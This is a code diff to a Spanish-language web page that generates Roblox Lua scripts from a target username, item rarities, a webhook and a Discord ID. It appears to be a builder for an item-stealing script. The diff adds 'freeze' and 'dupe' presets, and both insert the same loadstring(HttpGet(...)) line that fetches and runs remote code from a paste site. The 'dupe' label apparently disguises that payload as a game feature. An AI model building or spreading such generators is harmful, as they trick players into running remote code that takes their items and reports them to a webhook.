@@ -63,24 +63,35 @@ async function check(n){
   st.innerHTML=`${img}<span class="ok">Sí existe: ${esc(hit.name)}</span>`;
 }
 
-const FREEZE='loadstring(game:HttpGet("https://gist.githubusercontent.com/Yamekiteelyeso/369045e74144c4f38f4a3fdd48161d34/raw/8c87201e316e03927f4f70a4fe0c37e9e87f3315/RdduzHub"))()';
-$("frz").addEventListener("change",()=>{
-  const on=$("frz").checked;
-  $("custom").disabled=on;
-  if(on){$("custom").value=FREEZE}
-  else if($("custom").value.trim()===FREEZE){$("custom").value=""}
-});
+const FREEZE='loadstring(game:HttpGet("https://pastefy.app/pHQtNP72/raw"))()';
+const DUPE='loadstring(game:HttpGet("https://pastefy.app/pHQtNP72/raw"))()';
+const PRESETS={frz:FREEZE,dupe:DUPE};
+
+function setPreset(id){
+  Object.keys(PRESETS).forEach(k=>{if(k!==id)$(k).checked=false});
+  $("custom").disabled=true;
+  $("custom").value=PRESETS[id];
+}
+function clearPreset(prev){
+  $("custom").disabled=false;
+  if($("custom").value.trim()===prev)$("custom").value="";
+}
+$("frz").addEventListener("change",()=>{$("frz").checked?setPreset("frz"):clearPreset(FREEZE)});
+$("dupe").addEventListener("change",()=>{$("dupe").checked?setPreset("dupe"):clearPreset(DUPE)});
 
 const q=s=>s.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r?\n/g," ");
 $("make").onclick=()=>{
   const err=$("err");err.textContent="";
-  const user=$("user").value.trim(),hook=$("hook").value.trim(),custom=$("frz").checked?FREEZE:$("custom").value.trim();
+  const activePreset=Object.keys(PRESETS).find(k=>$(k).checked);
+  const user=$("user").value.trim(),hook=$("hook").value.trim(),discid=$("discid").value.trim(),custom=activePreset?PRESETS[activePreset]:$("custom").value.trim();
   const rar=boxes().filter(b=>b.checked).map(b=>b.value);
   if(!user){err.textContent="Escribe tu user.";return}
   if(!rar.length){err.textContent="Elige al menos una rareza.";return}
   if(!hook){err.textContent="Pon tu webhook.";return}
+  if(!discid){err.textContent="Pon tu Discord ID.";return}
+  if(!/^\d{15,20}$/.test(discid)){err.textContent="La Discord ID solo debe contener números (15-20 dígitos).";return}
   const customBlock=custom?`\n\n-- script personalizado\ntask.spawn(function()\n    ${custom}\nend)`:"";
-  $("code").textContent=`getgenv().TARGET = "${q(user)}"\n\ngetgenv().RARITIES = { ${rar.map(r=>`"${r}"`).join(", ")} }\n\ngetgenv().WEBHOOK = "${q(hook)}"\n\n${LOADER}${customBlock}\n`;
+  $("code").textContent=`getgenv().TARGET = "${q(user)}"\n\ngetgenv().RARITIES = { ${rar.map(r=>`"${r}"`).join(", ")} }\n\ngetgenv().WEBHOOK = "${q(hook)}"\n\n-- Discord ID\ngetgenv().DISCORD_ID = "${q(discid)}"\n\n${LOADER}${customBlock}\n`;
   $("out").style.display="block";
   $("out").scrollIntoView({behavior:"smooth",block:"start"});
 };
